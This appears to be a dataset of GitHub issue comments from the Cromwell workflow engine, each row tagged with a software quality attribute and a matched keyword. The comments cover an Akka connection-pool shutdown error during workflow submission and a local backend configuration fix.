https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:515,Availability,down,down,515,"> When run the server modle; > ; > ```; > root@NanoTNGS-DEV:~# java -jar /root/cromwell/cromwell-62.jar submit -t wdl hello.wdl -h http://localhost:8000; > [2021-05-14 14:28:43,33] [info] Slf4jLogger started; > [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; > [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; > java.lang.IllegalStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1575,Availability,Fault,FaultHandling,1575,"alStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); > 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); > ```. i met the same question, have you solved it? any advice will be appreciate,thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1605,Availability,Fault,FaultHandling,1605,"alStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); > 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); > ```. i met the same question, have you solved it? any advice will be appreciate,thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1656,Availability,Fault,FaultHandling,1656,"alStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); > 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); > ```. i met the same question, have you solved it? any advice will be appreciate,thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1680,Availability,Fault,FaultHandling,1680,"alStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); > 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); > ```. i met the same question, have you solved it? any advice will be appreciate,thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1731,Availability,Fault,FaultHandling,1731,"alStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); > 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); > ```. i met the same question, have you solved it? any advice will be appreciate,thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1756,Availability,Fault,FaultHandling,1756,"alStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); > 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); > 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); > 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); > ```. i met the same question, have you solved it? any advice will be appreciate,thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1133,Energy Efficiency,adapt,adapted,1133,"localhost:8000; > [2021-05-14 14:28:43,33] [info] Slf4jLogger started; > [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; > [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; > java.lang.IllegalStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:24",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:1133,Modifiability,adapt,adapted,1133,"localhost:8000; > [2021-05-14 14:28:43,33] [info] Slf4jLogger started; > [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; > [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; > java.lang.IllegalStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:293); > 	at akka.dispatch.Mailbox.run(Mailbox.scala:228); > 	at akka.dispatch.Mailbox.exec(Mailbox.scala:24",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:646,Testability,Log,Logic,646,"> When run the server modle; > ; > ```; > root@NanoTNGS-DEV:~# java -jar /root/cromwell/cromwell-62.jar submit -t wdl hello.wdl -h http://localhost:8000; > [2021-05-14 14:28:43,33] [info] Slf4jLogger started; > [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; > [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; > java.lang.IllegalStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:45,Availability,error,error,45,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:584,Availability,error,error,584,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:953,Availability,error,error,953,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:233,Deployability,configurat,configuration,233,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288
https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:687,Deployability,configurat,configuration,687,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started 